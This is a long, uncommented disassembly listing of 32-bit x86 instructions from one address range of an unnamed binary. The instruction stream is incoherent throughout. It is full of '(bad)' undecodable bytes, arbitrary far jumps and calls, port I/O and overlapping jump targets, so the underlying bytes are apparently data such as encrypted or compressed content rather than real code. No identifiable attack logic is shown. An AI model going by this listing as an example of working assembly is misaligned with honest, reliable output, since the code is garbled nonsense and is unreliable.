  421cb1:	mov    esp,0x9b8bfd09
  421cb6:	retf   0xc58
  421cb9:	inc    edi
  421cba:	shl    DWORD PTR [edx+0x6b],1
  421cbd:	(bad)  
  421cbe:	mov    esp,0x9b8bfd09
  421cc3:	retf   0xc58
  421cc6:	inc    edi
  421cc7:	xchg   esi,eax
  421cc8:	mov    WORD PTR [ecx-0x2],fs
  421ccb:	xchg   ebx,eax
  421ccc:	or     ebp,edi
  421cce:	fwait
  421ccf:	fwait
  421cd0:	retf   0xae72
  421cd3:	popf   
  421cd4:	mov    al,ds:0x22d39404
  421cd9:	mov    gs,WORD PTR [ebp+0x4b22ad66]
  421cdf:	mov    eax,0xef13b7d2
  421ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ce5:	scas   eax,DWORD PTR es:[edi]
  421ce6:	mov    eax,0x2ef69d4a
  421ceb:	ror    BYTE PTR [ebp-0x4ff007f],cl
  421cf1:	rol    DWORD PTR [ebp-0x73c54dc6],0xe8
  421cf8:	pop    eax
  421cf9:	sub    esp,eax
  421cfb:	pop    ecx
  421cfc:	aaa    
  421cfd:	cmp    dl,BYTE PTR [ebx+0x56c03b15]
  421d03:	(bad)  
  421d04:	jnp    0x421d3e
  421d06:	sbb    al,0x1c
  421d08:	div    DWORD PTR [ebx-0x7c]
  421d0b:	xchg   edi,eax
  421d0c:	sbb    eax,0xb7311a65
  421d11:	or     eax,0xe7b958d5
  421d16:	adc    ah,BYTE PTR [esi+0x34a9be67]
  421d1c:	(bad)  
  421d1d:	or     al,0xb3
  421d1f:	adc    BYTE PTR [bp+si],dh
  421d22:	int3   
  421d23:	rol    ebp,cl
  421d25:	sub    DWORD PTR [edi],esp
  421d27:	sar    DWORD PTR [edx+0x558397c1],1
  421d2d:	pusha  
  421d2e:	std    
  421d2f:	pop    ebx
  421d30:	outs   dx,DWORD PTR ds:[esi]
  421d31:	and    eax,DWORD PTR [eax]
  421d33:	pop    edx
  421d34:	inc    al
  421d36:	cmp    esi,0xd9cfee9c
  421d3c:	adc    DWORD PTR [edx],eax
  421d3e:	mov    ebp,0x1fedffb5
  421d43:	bound  ecx,QWORD PTR [ebx-0x7f]
  421d46:	fcmovnbe st,st(4)
  421d48:	ins    BYTE PTR es:[edi],dx
  421d49:	jno    0x421db1
  421d4b:	xor    BYTE PTR [ebp+0x22],0x4d
  421d4f:	pop    ds
  421d50:	pop    esp
  421d51:	jmp    0x94637d3f
  421d56:	add    DWORD PTR [ebx+0xe],eax
  421d59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d5a:	hlt    
  421d5b:	aaa    
  421d5c:	lods   al,BYTE PTR ds:[esi]
  421d5d:	or     BYTE PTR [edi-0x77],dl
  421d60:	mov    edi,fs
  421d62:	inc    ebp
  421d63:	cmp    DWORD PTR [eax+0x24ec3ca1],edi
  421d69:	fcmovnb st,st(5)
  421d6b:	sub    eax,0x84e825f1
  421d70:	outs   dx,BYTE PTR ds:[esi]
  421d71:	out    0x3b,eax
  421d73:	pusha  
  421d74:	fistp  QWORD PTR [ebx]
  421d76:	(bad)  
  421d77:	cmp    ch,BYTE PTR [ebp+eiz*1-0x5b]
  421d7b:	cmc    
  421d7c:	mov    al,ds:0xa4a0ec22
  421d81:	aam    0x24
  421d83:	xchg   edi,eax
  421d84:	(bad)  
  421d85:	popa   
  421d86:	inc    esp
  421d87:	pop    ds
  421d88:	mov    bl,bh
  421d8a:	jmp    0x421d88
  421d8c:	popf   
  421d8d:	idiv   DWORD PTR [edx]
  421d8f:	mov    al,ds:0x69555ef4
  421d94:	(bad)  
  421d95:	fcom   QWORD PTR [ebx+0x2449c7cf]
  421d9b:	fs rol cl,cl
  421d9e:	mov    edi,0xbc3b26a9
  421da3:	sub    al,al
  421da5:	xor    BYTE PTR [esi-0x7b],0xe8
  421da9:	(bad)  [edi+0x615ab61a]
  421daf:	pop    esi
  421db0:	rcl    BYTE PTR [ebp-0x57],1
  421db3:	mov    eax,0xd64e6758
  421db8:	ror    BYTE PTR [eax],1
  421dba:	push   cs
  421dbb:	jmp    0xfdd7:0xb963effe
  421dc2:	out    0x6a,eax
  421dc4:	scas   al,BYTE PTR es:[edi]
  421dc5:	xor    BYTE PTR [ebp-0x216ce9b5],bl
  421dcb:	mov    dl,0x7c
  421dcd:	push   ss
  421dce:	std    
  421dcf:	xor    esp,DWORD PTR [edx]
  421dd1:	push   esi
  421dd2:	inc    esp
  421dd3:	ficom  WORD PTR [eax]
  421dd5:	push   0x6a
  421dd7:	add    DWORD PTR [esi-0x4596bf3b],ebx
  421ddd:	(bad)  
  421dde:	jl     0x421e3c
  421de0:	add    eax,0x6b9dc9e0
  421de5:	sti    
  421de6:	xor    ch,BYTE PTR [esi]
  421de8:	lds    esp,FWORD PTR [edx]
  421dea:	out    0xea,al
  421dec:	sbb    BYTE PTR [ebp-0x27],dh
  421def:	in     eax,0xcc
  421df1:	inc    ebp
  421df2:	sub    eax,0x6f9af694
  421df7:	jmp    0x421e05
  421df9:	out    dx,eax
  421dfa:	xor    BYTE PTR [ebx-0x4b],0xf5
  421dfe:	add    al,BYTE PTR [ebx-0x49e4ad66]
  421e04:	not    cl
  421e06:	std    
  421e07:	stos   DWORD PTR es:[edi],eax
  421e08:	mov    edi,0x241eedb2
  421e0d:	xchg   esp,eax
  421e0e:	test   al,0x28
  421e10:	mov    ebx,0xf322af49
  421e15:	cmp    dl,BYTE PTR [esi+0x0]
  421e18:	jnp    0x421dde
  421e1a:	daa    
  421e1b:	(bad)  
  421e1c:	adc    DWORD PTR [eax-0x64],edi
  421e1f:	sub    eax,eax
  421e21:	push   0xb6aa2637
  421e26:	outs   dx,DWORD PTR ds:[esi]
  421e27:	xchg   ebp,eax
  421e28:	inc    edx
  421e29:	dec    esp
  421e2a:	jge    0x421e99
  421e2c:	imul   esp,DWORD PTR [esi+0x38],0x3b
  421e30:	outs   dx,BYTE PTR ds:[esi]
  421e31:	jmp    0xe37287dd
  421e36:	xchg   ecx,eax
  421e37:	setb   BYTE PTR [ecx]
  421e3a:	sub    BYTE PTR [ecx],0x95
  421e3d:	push   ebp
  421e3e:	nop
  421e3f:	push   esp
  421e40:	and    bh,dh
  421e42:	hlt    
  421e43:	inc    ebp
  421e44:	pop    edx
  421e45:	clc    
  421e46:	cmp    al,0xab
  421e48:	in     eax,0xfe
  421e4a:	inc    edi
  421e4b:	push   edx
  421e4c:	fucomp st(5)
  421e4e:	push   0xa35dd208
  421e53:	mov    bh,0xef
  421e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e56:	mov    ecx,0xbd5f147
  421e5b:	das    
  421e5c:	mov    cl,0x80
  421e5e:	xchg   ebp,eax
  421e5f:	int    0xaf
  421e61:	pop    ds
  421e62:	and    al,0x13
  421e64:	aas    
  421e65:	mov    ecx,DWORD PTR [esi+0x7dc0421]
  421e6b:	mov    eax,ds:0xc363cea
  421e70:	and    BYTE PTR [esp+eiz*4],0x71
  421e74:	push   esp
  421e75:	test   ecx,edx
  421e77:	jmp    0x421e84
  421e79:	sbb    dl,BYTE PTR [ebx-0xfb033ae]
  421e7f:	ret    
  421e80:	cmp    al,0xb6
  421e82:	dec    esi
  421e83:	imul   ecx,DWORD PTR [ebx],0x63
  421e86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e87:	xchg   edi,eax
  421e88:	mov    eax,ds:0xfdb73c29
  421e8d:	sahf   
  421e8e:	repz fcomp QWORD PTR [ebx]
  421e91:	pop    eax
  421e92:	dec    eax
  421e93:	mov    edx,0xee35455a
  421e98:	xchg   esp,eax
  421e99:	daa    
  421e9a:	int3   
  421e9b:	int    0x86
  421e9d:	jno    0x421f15
  421e9f:	popa   
  421ea0:	mov    eax,eax
  421ea2:	mov    ecx,0x5fd836c
  421ea7:	pop    eax
  421ea8:	imul   eax,DWORD PTR [ebx+0x55498075],0x63137f4f
  421eb2:	push   esi
  421eb3:	sbb    BYTE PTR [eax-0x26cc9cf],al
  421eb9:	xchg   BYTE PTR [esi+esi*8],dl
  421ebc:	repz or al,0xa5
  421ebf:	push   edi
  421ec0:	dec    eax
  421ec1:	or     DWORD PTR [edi+0x4b760777],esi
  421ec7:	sub    esi,ebp
  421ec9:	push   edi
  421eca:	(bad)  
  421ecb:	stc    
  421ecc:	mov    eax,ds:0x7e6d2b9a
  421ed1:	stos   DWORD PTR es:[edi],eax
  421ed2:	jmp    0x236b315e
  421ed7:	jo     0x421f26
  421ed9:	int    0x4a
  421edb:	xor    bh,BYTE PTR [eax-0x5d9d5739]
  421ee1:	and    al,0x2
  421ee3:	inc    esp
  421ee4:	js     0x421ec9
  421ee6:	xchg   DWORD PTR [ebp-0x45264458],ebp
  421eec:	push   es
  421eed:	ins    DWORD PTR es:[edi],dx
  421eee:	pop    ds
  421eef:	jle    0x421f60
  421ef1:	push   eax
  421ef2:	cmp    edi,eax
  421ef4:	pop    ss
  421ef5:	push   ebx
  421ef6:	mov    ebp,0xf6a8221f
  421efb:	or     al,0x4a
  421efd:	xor    esi,esi
  421eff:	lea    esp,[ecx-0x5421e7b6]
  421f05:	icebp  
  421f06:	clc    
  421f07:	lods   eax,DWORD PTR ds:[esi]
  421f08:	jbe    0x421e9b
  421f0a:	das    
  421f0b:	test   DWORD PTR [edx],0x18ed50da
  421f11:	jns    0x421ef2
  421f13:	mov    edx,0x60b3b8ef
  421f18:	inc    ecx
  421f19:	lods   eax,DWORD PTR ds:[esi]
  421f1a:	xchg   ebp,eax
  421f1b:	sbb    cl,BYTE PTR [edx+0xc]
  421f1e:	in     al,0x68
  421f20:	jb     0x421f63
  421f22:	scas   eax,DWORD PTR es:[di]
  421f24:	inc    edx
  421f25:	mov    ah,0xeb
  421f27:	and    eax,0x81602231
  421f2c:	push   ds
  421f2d:	add    esp,DWORD PTR [edx-0x4f]
  421f30:	ins    DWORD PTR es:[edi],dx
  421f31:	pop    ss
  421f32:	or     DWORD PTR [edi],edx
  421f34:	in     eax,0x5
  421f36:	jnp    0x421f24
  421f38:	mov    al,ds:0xf7611fc2
  421f3d:	xchg   esi,eax
  421f3e:	dec    eax
  421f3f:	into   
  421f40:	aas    
  421f41:	pop    ecx
  421f42:	xor    dh,bl
  421f44:	sti    
  421f45:	pop    edx
  421f46:	add    eax,0x169acc19
  421f4b:	push   0x219df68b
  421f50:	lods   eax,DWORD PTR ds:[esi]
  421f51:	stos   BYTE PTR es:[edi],al
  421f52:	mov    ah,BYTE PTR [esi+0x66]
  421f55:	retf   
  421f56:	popa   
  421f57:	fist   WORD PTR fs:[edi+0x7a9a1ae1]
  421f5e:	clc    
  421f5f:	cwde   
  421f60:	nop
  421f61:	imul   ecx,DWORD PTR [ebp-0x1551dfa3],0x5f
  421f68:	dec    ecx
  421f69:	test   eax,0x738c177e
  421f6e:	push   ecx
  421f6f:	jp     0x421f46
  421f71:	fs add eax,0xdbdc307f
  421f77:	pop    esp
  421f78:	in     eax,0x76
  421f7a:	or     BYTE PTR [edx+0x47],bl
  421f7d:	mov    bh,0x51
  421f7f:	fwait
  421f80:	or     dh,BYTE PTR [ecx-0x75]
  421f83:	jmp    0xfac3e7b9
  421f88:	adc    esi,DWORD PTR [edi+0x6e3d7522]
  421f8e:	cmp    BYTE PTR [edi],bh
  421f90:	outs   dx,BYTE PTR ds:[esi]
  421f91:	lods   eax,DWORD PTR ds:[esi]
  421f92:	mov    cl,0x50
  421f94:	mov    esp,0xd7ed0065
  421f99:	inc    edi
  421f9a:	shl    DWORD PTR [ecx-0x2d],cl
  421f9d:	sub    eax,DWORD PTR [ebp+0x6d]
  421fa0:	daa    
  421fa1:	out    0xad,al
  421fa3:	cmp    esp,DWORD PTR [edx+0x3d3990bd]
  421fa9:	push   edi
  421faa:	sub    DWORD PTR [edx],0xffffffcd
  421fad:	fwait
  421fae:	enter  0xd106,0x45
  421fb2:	or     BYTE PTR [ebx-0x39],bh
  421fb5:	sbb    eax,0x3fcfab94
  421fba:	and    eax,0x4269c2a7
  421fbf:	rcr    DWORD PTR [edx],cl
  421fc1:	enter  0x4d90,0x55
  421fc5:	ins    DWORD PTR es:[edi],dx
  421fc6:	and    al,dl
  421fc8:	loopne 0x421f4f
  421fca:	push   cs
  421fcb:	push   cs
  421fcc:	xchg   DWORD PTR ds:0x83debc32,esp
  421fd2:	push   ds
  421fd3:	pop    esi
  421fd4:	or     BYTE PTR [edx-0xd],dl
  421fd7:	cmp    eax,0x8d9bffd4
  421fdc:	push   es
  421fdd:	fsubr  st,st(4)
  421fdf:	cs mov cl,al
  421fe2:	aaa    
  421fe3:	jl     0x421fac
  421fe5:	daa    
  421fe6:	stos   BYTE PTR es:[edi],al
  421fe7:	fs mov dl,0x7d
  421fea:	push   ss
  421feb:	fwait
  421fec:	pop    es
  421fed:	test   eax,0xa8b991db
  421ff2:	or     DWORD PTR [ecx-0xfc668f8],edx
  421ff8:	mov    dl,0x1b
  421ffa:	inc    DWORD PTR [ecx+edx*4+0x66]
  421ffe:	not    DWORD PTR [ecx+0x286d9241]
  422004:	pop    esi
  422005:	sub    al,0xe2
  422007:	dec    ecx
  422008:	xchg   edx,eax
  422009:	sar    al,1
  42200b:	adc    al,0x86
  42200d:	or     edx,ebx
  42200f:	mov    ebp,0x693d4b2d
  422014:	push   ds
  422015:	sbb    BYTE PTR [esi],0xde
  422018:	jg     0x421fe2
  42201a:	scas   al,BYTE PTR es:[edi]
  42201b:	sub    ch,BYTE PTR [ebx+edx*8+0x29bcd740]
  422022:	jno    0x42201f
  422024:	xor    eax,0x1ce344e9
  422029:	xchg   BYTE PTR ds:0x3fcb43df,al
  42202f:	dec    ecx
  422030:	mov    al,0x6c
  422032:	pop    ebp
  422033:	sbb    bl,ch
  422035:	cmp    al,0xb3
  422037:	fild   WORD PTR [esi+0x125af9b6]
  42203d:	into   
  42203e:	and    esi,edx
  422040:	dec    eax
  422041:	retf   
  422042:	xchg   ebx,eax
  422043:	sbb    DWORD PTR [ecx],eax
  422045:	jmp    0x4220b7
  422047:	mov    ds:0x9f930375,al
  42204c:	adc    BYTE PTR [ebx],ch
  42204e:	mov    ah,0x56
  422050:	pop    ebp
  422051:	xchg   edi,eax
  422052:	imul   edx,ebp,0x62
  422055:	xchg   ecx,eax
  422056:	mov    ecx,edi
  422058:	mov    ds:0x6123bf7c,eax
  42205d:	mov    ah,0xcc
  42205f:	adc    al,BYTE PTR [eax]
  422061:	and    eax,0xe9eb333e
  422066:	mov    dl,0x89
  422068:	xchg   ebx,eax
  422069:	ja     0x422037
  42206b:	shl    DWORD PTR [eax+0x2c74a20c],0x91
  422072:	into   
  422073:	mov    ebp,0x7c4db1df
  422078:	adc    ebp,DWORD PTR ds:0x60eab8bb
  42207e:	xor    DWORD PTR [ebp+esi*8-0x6f855de0],ebp
  422085:	xchg   ebx,eax
  422086:	cli    
  422087:	mov    esp,DWORD PTR [ebp+eax*2+0x72]
  42208b:	dec    ebx
  42208c:	xor    eax,DWORD PTR [esi-0x3c]
  42208f:	mov    al,0x84
  422091:	retf   
  422092:	push   edx
  422093:	leave  
  422094:	lds    ebp,FWORD PTR [edx+0xb39962a]
  42209a:	test   BYTE PTR [esi+ebp*8-0x13159bc0],dl
  4220a1:	(bad)
  4220a4:	xor    al,0x7d
  4220a6:	mov    dh,0xb4
  4220a8:	scas   eax,DWORD PTR es:[edi]
  4220a9:	mov    bl,0x27
  4220ab:	dec    ebx
  4220ac:	mov    ecx,0xadba4012
  4220b1:	cmp    esi,DWORD PTR [eax-0x1c8c71f5]
  4220b7:	push   edx
  4220b8:	mov    ch,0x9c
  4220ba:	mov    ah,0x18
  4220bc:	fistp  WORD PTR [ecx]
  4220be:	adc    bl,BYTE PTR [esi+0x1d]
  4220c1:	inc    ebx
  4220c2:	jb     0x4220c7
  4220c4:	lds    esp,FWORD PTR [edx-0x8bee25d]
  4220ca:	lds    eax,FWORD PTR [esi+0x3ba0087c]
  4220d0:	pop    ecx
  4220d1:	adc    al,0x38
  4220d3:	addr16 sbb eax,0xafe44087
  4220d9:	mov    ch,0x8
  4220db:	pop    ss
  4220dc:	push   es
  4220dd:	retf   
  4220de:	jno    0x4220ec
  4220e0:	dec    edi
  4220e1:	dec    bl
  4220e3:	into   
  4220e4:	(bad)  
  4220e6:	jp     0x422096
  4220e8:	call   0x6b11b42a
  4220ed:	mov    esp,0x3fae9ad3
  4220f2:	pop    esp
  4220f3:	sahf   
  4220f4:	iret   
  4220f5:	mov    al,0xb5
  4220f7:	test   BYTE PTR [edi+0xbeabe6],dh
  4220fd:	(bad)
  422100:	push   ebx
  422101:	add    bl,BYTE PTR [eax+0x12d4bef7]
  422107:	push   edx
  422108:	cmp    ebp,DWORD PTR [esi-0x4b]
  42210b:	cli    
  42210c:	jns    0x42210c
  42210e:	fdivr  QWORD PTR [esi+0x26]
  422111:	mov    edx,0xc7effff6
  422116:	mov    esi,0xa53825fe
  42211b:	xlat   BYTE PTR ds:[ebx]
  42211c:	mov    ebx,0x2b88b881
  422121:	jbe    0x4220df
  422123:	(bad)  
  422124:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422125:	and    al,0x99
  422127:	pushf  
  422128:	cs mov bh,0x8e
  42212b:	pop    edx
  42212c:	cmp    DWORD PTR ds:0xe3578e1b,esp
  422132:	imul   edx,DWORD PTR [esp+esi*2-0x743e7e84],0x53
  42213a:	and    al,bl
  42213c:	call   0xe9ed:0xe289470e
  422143:	sbb    eax,0xe2a4a6a0
  422148:	lea    esp,[edi-0x5a]
  42214b:	pop    esp
  42214c:	(bad)  
  42214d:	movzx  ecx,cl
  422150:	ja     0x422173
  422152:	inc    eax
  422153:	lock lahf 
  422155:	pusha  
  422156:	push   0x60
  422158:	fadd   st,st(5)
  42215a:	jb     0x422142
  42215c:	jbe    0x422108
  42215e:	ret    
  42215f:	loopne 0x422195
  422161:	int3   
  422162:	retf   
  422163:	jns    0x422117
  422165:	addr16 dec edi
  422167:	shr    DWORD PTR [esi],0x3f
  42216a:	or     esi,DWORD PTR [edx]
  42216c:	jno    0x42216d
  42216e:	add    al,0xc6
  422170:	add    esi,DWORD PTR [edx]
  422172:	cmp    ecx,DWORD PTR [ebp+0x6f79dda2]
  422178:	inc    esi
  422179:	js     0x422132
  42217b:	shl    DWORD PTR [ebp-0x6c],1
  42217e:	int    0xf3
  422180:	adc    ah,al
  422182:	out    dx,eax
  422183:	mov    ebx,?
  422185:	in     al,dx
  422186:	int    0x88
  422188:	sub    eax,0x3d902c86
  42218d:	call   DWORD PTR [edi]
  42218f:	(bad)
  422192:	inc    ecx
  422193:	jecxz  0x42215c
  422195:	(bad)  
  422196:	out    0x1,al
  422198:	xor    DWORD PTR [ecx+eax*8-0x34b1b32d],0xffffff8a
  4221a0:	inc    esi
  4221a1:	adc    ah,cl
  4221a3:	fnsave [edx-0x45e42c29]
  4221a9:	icebp  
  4221aa:	xchg   ebp,eax
  4221ab:	cmp    DWORD PTR [edi+ebx*1],ebx
  4221ae:	mov    dl,0xef
  4221b0:	mov    al,0x3a
  4221b2:	xchg   bl,ch
  4221b4:	shl    ah,0x95
  4221b7:	pshufw mm0,QWORD PTR [edx-0x6f],0xde
  4221bc:	js     0x4221d7
  4221be:	adc    DWORD PTR [esi-0x5934e3ee],ecx
  4221c4:	jo     0x422201
  4221c6:	mov    WORD PTR [ebx+0x20717b9d],es
  4221cc:	pop    es
  4221cd:	ss fwait
  4221cf:	aad    0xc8
  4221d1:	retf   
  4221d2:	es or  al,0xcf
  4221d5:	je     0x4221e8
  4221d7:	xchg   edx,eax
  4221d8:	or     al,0x67
  4221da:	cmp    eax,0x14506b32
  4221df:	sub    al,0xac
  4221e1:	(bad)  
  4221e2:	stos   DWORD PTR es:[edi],eax
  4221e3:	cmp    al,BYTE PTR [ecx+ebx*8+0x187f0aa4]
  4221ea:	and    eax,0xd2095c43
  4221ef:	jecxz  0x422182
  4221f1:	jb     0x422264
  4221f3:	mov    eax,DWORD PTR ds:0x3e9f2419
  4221f9:	and    dl,ch
  4221fb:	aaa    
  4221fc:	jmp    0xa8a42501
  422201:	sahf   
  422202:	jno    0x42221c
  422204:	adc    BYTE PTR [eax],ch
  422206:	pop    esi
  422207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422208:	mov    ds,WORD PTR [eax-0xd]
  42220b:	test   DWORD PTR [eax+0x4447d79e],edi
  422211:	and    al,0xb1
  422213:	sub    al,0xb9
  422215:	pop    eax
  422216:	and    al,0x23
  422218:	jnp    0x422284
  42221a:	aam    0x77
  42221c:	(bad)  
  42221d:	stos   BYTE PTR es:[edi],al
  42221e:	daa    
  42221f:	ficomp DWORD PTR [esi+0x200ed747]
  422225:	dec    ebp
  422226:	dec    esi
  422227:	sbb    DWORD PTR [ebx+ecx*1+0x71de9d],eax
  42222e:	mov    edx,0x5277abab
  422233:	js     0x4221d6
  422235:	inc    ebp
  422236:	jp     0x42229e
  422238:	mov    DWORD PTR [esi],esp
  42223a:	shr    ah,0xe6
  42223d:	add    BYTE PTR [esi+0x7a],bl
  422240:	jp     0x4222a3
  422242:	mov    edx,0xb6c5ef1a
  422247:	dec    edi
  422248:	push   cs
  422249:	jle    0x422256
  42224b:	xor    BYTE PTR [ebp-0x6e],al
  42224e:	sbb    dh,0x0
  422251:	xchg   ebx,eax
  422252:	pop    edi
  422253:	leave  
  422254:	jg     0x422201
  422256:	popf   
  422257:	xor    DWORD PTR [esi+esi*4-0x6e],ebx
  42225b:	mov    BYTE PTR [esi-0x3],dl
  42225e:	sahf   
  42225f:	pop    eax
  422260:	fs push esi
  422262:	cmp    esp,DWORD PTR [ebx+0x4a42833a]
  422268:	idiv   ebx
  42226a:	in     eax,0x2e
  42226c:	adc    BYTE PTR [ecx+0x5a],dl
  42226f:	xor    edi,esi
  422271:	in     eax,dx
  422272:	cmc    
  422273:	out    dx,eax
  422274:	pop    ecx
  422275:	add    esi,DWORD PTR [eax+0x5]
  422278:	arpl   WORD PTR [eax+edi*2+0x57],ax
  42227c:	out    0x94,eax
  42227e:	xchg   ebx,eax
  42227f:	adc    BYTE PTR [edx],ch
  422281:	pop    esi
  422282:	call   0x7de315af
  422287:	loop   0x4222c0
  422289:	in     ax,0x6f
  42228c:	cmp    DWORD PTR [ecx],ebp
  42228e:	loop   0x4222ba
  422290:	mov    BYTE PTR [edx+0x3c],dl
  422293:	sub    esp,edi
  422295:	cmp    ebp,DWORD PTR [ebx]
  422297:	imul   edx,DWORD PTR [edi-0x61859f12],0x5e61b69b
  4222a1:	jb     0x4222a7
  4222a3:	mov    esp,0xba8207c2
  4222a8:	test   al,0x1c
  4222aa:	mov    bh,0xa1
  4222ac:	(bad)  
  4222ad:	test   al,0x85
  4222af:	stc    
  4222b0:	and    BYTE PTR [esi-0x4b],bh
  4222b3:	ret    
  4222b4:	jnp    0x42223e
  4222b6:	and    bl,BYTE PTR [ecx]
  4222b8:	mov    al,ds:0x12ffa248
  4222bd:	lods   al,BYTE PTR ds:[esi]
  4222be:	int3   
  4222bf:	inc    esp
  4222c0:	pop    ebx
  4222c1:	or     DWORD PTR [esi],edx
  4222c3:	mov    ah,0x31
  4222c5:	or     dl,BYTE PTR [esi]
  4222c7:	inc    edi
  4222c8:	or     eax,0xaa1e1005
  4222cd:	fstp   TBYTE PTR [eax+ebx*8-0x3384923e]
  4222d4:	shl    BYTE PTR [ebx],0x66
  4222d7:	jmp    0x42233b
  4222d9:	xor    eax,0x3fd94dc9
  4222de:	inc    ecx
  4222df:	loop   0x42235e
  4222e1:	mov    al,ds:0x8353d3e2
  4222e6:	mov    BYTE PTR [ecx],bh
  4222e8:	cmp    eax,0x173860ad
  4222ed:	cwde   
  4222ee:	(bad)  
  4222f0:	idiv   BYTE PTR [edi-0x7300d812]
  4222f6:	pop    esp
  4222f7:	imul   esi,DWORD PTR [eax+0x3ba69526],0x4626d3bc
  422301:	ror    BYTE PTR [esi+0x71d916ad],1
  422307:	outs   dx,DWORD PTR ds:[esi]
  422308:	dec    ebx
  422309:	xchg   esi,eax
  42230a:	mov    ds:0xe7f82867,al
  42230f:	stc    
  422310:	xchg   ebp,eax
  422311:	out    dx,eax
  422312:	(bad)  
  422313:	jl     0x4222b8
  422315:	push   ss
  422316:	fxch   st(5)
  422318:	enter  0x3232,0x50
  42231c:	cmp    eax,0x41a1130b
  422321:	fisubr WORD PTR [esp+esi*2+0x34087b1b]
  422328:	xchg   DWORD PTR [esi],ebx
  42232a:	js     0x422332
  42232c:	or     BYTE PTR [edi-0x28],cl
  42232f:	or     bl,bh
  422331:	ficomp DWORD PTR [eax-0x72df5a21]
  422337:	pop    di
  422339:	adc    esp,DWORD PTR [eax+ebp*1+0x1a]
  42233d:	clc    
  42233e:	jmp    0xffa8:0x2c8a3624
  422345:	mov    ebx,0x22692ac
  42234a:	mov    cl,ch
  42234c:	popa   
  42234d:	mov    eax,ds:0xc0bbf93
  422352:	lds    esp,FWORD PTR [eax-0x71]
  422355:	and    cl,cl
  422357:	push   esi
  422358:	pop    eax
  422359:	loope  0x4222f7
  42235b:	xlat   BYTE PTR ds:[ebx]
  42235c:	daa    
  42235d:	mov    BYTE PTR [eax],bh
  42235f:	jne    0x42233f
  422361:	pop    ds
  422362:	test   BYTE PTR [edi*8+0x198b97f4],bh
  422369:	int    0xd6
  42236b:	mov    ecx,0x139cbd42
  422370:	inc    ebp
  422371:	dec    ecx
  422372:	xor    BYTE PTR [esi-0x1e],bl
  422375:	ins    DWORD PTR es:[edi],dx
  422376:	add    DWORD PTR [eax+0x76],esi
  422379:	fst    QWORD PTR [ecx-0x33b41d67]
  42237f:	push   cs
  422380:	fbld   TBYTE PTR [eax]
  422382:	fnsave [ebp-0xbe10b33]
  422388:	sbb    al,bh
  42238a:	jnp    0x4223e9
  42238c:	arpl   dx,di
  42238e:	sbb    ah,cl
  422390:	mov    ah,0x19
  422392:	dec    esp
  422393:	jg     0x4223a6
  422395:	scas   eax,DWORD PTR es:[edi]
  422396:	add    eax,0xe5d4e8ab
  42239b:	or     al,0xda
  42239d:	push   es
  42239e:	cmp    eax,0x75ce23ca
  4223a3:	retf   
  4223a4:	(bad)  
  4223a5:	push   ds
  4223a6:	sub    eax,ebx
  4223a8:	cld    
  4223a9:	sahf   
  4223aa:	(bad)  
  4223ab:	sub    BYTE PTR [ecx],bl
  4223ad:	arpl   WORD PTR [ebx+0x5e4676f8],dx
  4223b3:	add    cl,bl
  4223b5:	inc    edx
  4223b6:	dec    edi
  4223b7:	jns    0x4223fe
  4223b9:	icebp  
  4223ba:	xchg   edi,eax
  4223bb:	jmp    0x422369
  4223bd:	jl     0x4223a6
  4223bf:	test   eax,0x2f829d2c
  4223c4:	out    dx,eax
  4223c5:	aaa    
  4223c6:	rol    BYTE PTR [esi-0x1a6ae902],cl
  4223cc:	loopne 0x4223c1
  4223ce:	inc    edx
  4223cf:	pop    es
  4223d0:	mov    eax,0x43d13143
  4223d5:	loope  0x422378
  4223d7:	xor    eax,0xf64ac3fe
  4223dc:	mov    al,ds:0x99aa3d77
  4223e1:	mov    ebp,0xde6be8ae
  4223e6:	push   0x2980ad56
  4223eb:	cmp    eax,0xf40d41e6
  4223f0:	aas    
  4223f1:	xor    eax,0xc76aee74
  4223f6:	dec    edi
  4223f7:	loope  0x422427
  4223f9:	xchg   esp,eax
  4223fa:	sub    al,0x76
  4223fc:	(bad)  
  4223fd:	ins    DWORD PTR es:[edi],dx
  4223fe:	pop    esi
  4223ff:	js     0x422424
  422401:	rcl    esi,1
  422403:	jbe    0x42243b
  422405:	lahf   
  422406:	xchg   ebp,eax
  422407:	aam    0x98
  422409:	icebp  
  42240a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42240b:	pop    ss
  42240c:	hlt    
  42240d:	mov    ds:0xb8d8ac3c,eax
  422412:	(bad)  
  422413:	fist   WORD PTR [edx-0x6f12d88e]
  422419:	and    ah,BYTE PTR [ebx-0x7ea5ed2a]
  42241f:	lods   al,BYTE PTR ds:[esi]
  422420:	inc    eax
  422421:	lds    esi,FWORD PTR [esp+edx*2+0x25d66615]
  422428:	in     al,dx
  422429:	dec    esi
  42242a:	fwait
  42242b:	dec    eax
  42242c:	xchg   ch,cl
  42242e:	jns    0x4223f6
  422430:	jge    0x422412
  422432:	add    bl,dh
  422434:	test   DWORD PTR [ecx+0x49],ebx
  422437:	sub    dh,BYTE PTR [ebx*1+0x8c2fe99]
  42243e:	pop    ecx
  42243f:	scas   eax,DWORD PTR es:[edi]
  422440:	jmp    0x422456
  422442:	stos   DWORD PTR es:[edi],eax
  422443:	pushf  
  422444:	data16 (bad) 
  422446:	mov    DWORD PTR [edx+0x4b],edx
  422449:	ret    
  42244a:	nop
  42244b:	add    ch,BYTE PTR [ecx+0x6]
  42244e:	int3   
  42244f:	ins    DWORD PTR es:[edi],dx
  422450:	pushf  
  422451:	xchg   DWORD PTR [edi],edi
  422453:	jno    0x4223da
  422455:	xchg   al,dh
  422457:	xor    dl,BYTE PTR es:[esi]
  42245a:	push   ss
  42245b:	cmp    al,0x50
  42245d:	ret    0x78cd
  422460:	sbb    al,0xe5
  422462:	shl    dh,0xde
  422465:	push   ds
  422466:	mov    esi,0x46959932
  42246b:	outs   dx,BYTE PTR ds:[esi]
  42246c:	ret    
  42246d:	das    
  42246e:	outs   dx,DWORD PTR ds:[esi]
  42246f:	les    esp,FWORD PTR [edx+edx*1+0x52c28edd]
  422476:	push   esi
  422477:	out    0xa3,eax
  422479:	scas   al,BYTE PTR es:[edi]
  42247a:	inc    esp
  42247b:	mov    ds:0x70b45646,eax
  422480:	test   eax,0x8bc0cdb0
  422485:	es or  ecx,edi
  422488:	mov    cl,bh
  42248a:	dec    ecx
